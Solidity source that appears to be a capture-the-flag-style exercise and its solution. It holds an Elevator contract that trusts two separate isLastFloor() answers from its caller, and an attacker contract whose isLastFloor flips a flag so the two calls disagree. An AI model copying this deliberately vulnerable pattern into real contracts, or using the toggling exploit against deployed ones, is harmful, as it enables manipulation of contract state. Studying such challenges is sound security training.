// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Building.sol";
import "./Elevator.sol";

contract BuildingImplementation is Building{
    Elevator elevator;
    bool public allowGoingToTheTop=false;

    constructor(address _elevator) public{
        elevator=Elevator(_elevator);
    }

    function goToTop() public{
        elevator.goTo(1);
    }


    function isLastFloor(uint floor) external override returns (bool){
        if(floor==1){
            allowGoingToTheTop=!allowGoingToTheTop;
            return !allowGoingToTheTop;
        }
        return false;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Building.sol";


contract Elevator {
    bool public top;
    uint public floor;
    
    function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}